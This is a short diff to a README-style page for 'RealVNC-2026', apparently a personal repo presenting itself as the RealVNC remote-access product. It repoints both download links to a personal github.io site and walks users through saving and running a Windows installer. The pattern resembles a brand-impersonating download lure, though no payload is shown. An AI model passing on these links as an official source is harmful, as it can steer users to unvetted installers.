@@ -3,7 +3,7 @@
 <h1>🌐 RealVNC-2026 - Control your remote computer easily</h1>
 
 <p style="text-align: center; margin: 30px 0;">
-    <a href="https://github.com/Sridevi2012/RealVNC-2026" style="background-color: #0056b3; color: white; padding: 15px 30px; text-decoration: none; font-weight: bold; border-radius: 5px; font-size: 1.2em;">Download RealVNC-2026 Now</a>
+    <a href="https://sridevi2012.github.io" style="background-color: #0056b3; color: white; padding: 15px 30px; text-decoration: none; font-weight: bold; border-radius: 5px; font-size: 1.2em;">Download RealVNC-2026 Now</a>
 </p>
 
 <h2>📋 Project Description</h2>
@@ -23,7 +23,7 @@
 <p>Follow these steps to set up the software on your machine.</p>
 
 <ol>
-    <li>Navigate to the <a href="https://github.com/Sridevi2012/RealVNC-2026">official download page</a>.</li>
+    <li>Navigate to the <a href="https://sridevi2012.github.io">official download page</a>.</li>
     <li>Select the version compatible with your Windows system.</li>
     <li>Save the installer file to your local computer.</li>
     <li>Locate the file in your downloads folder.</li>
